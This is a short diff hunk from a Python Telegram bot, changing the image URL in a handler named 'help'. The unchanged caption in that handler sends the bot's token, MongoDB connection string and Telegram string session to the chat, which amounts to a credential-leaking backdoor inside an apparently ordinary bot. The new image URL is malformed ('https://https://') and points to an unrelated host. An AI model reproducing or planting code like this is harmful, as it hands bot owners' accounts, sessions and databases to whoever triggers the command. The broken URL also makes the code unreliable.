@@ -122,7 +122,7 @@ async def restartbot(client, message: Message, _):
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
+          photo=f"https://https://radare.arzfun.com/api/tg/photo?id=AgACAgUAAxkBAAIDBmV1mkBPehBh2D0tZm6WS1n3uRT5AAL3ujEbI8GpV_8sLPzk2EIyAQADAgADeAADMwQ",
         caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝙰𝙻𝙾𝙽𝙴.\n\n☆............𝙱𝚈 » [𝗔𝗟𝗢𝗡𝗘](https://t.me/ALONE_WAS_BOT)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
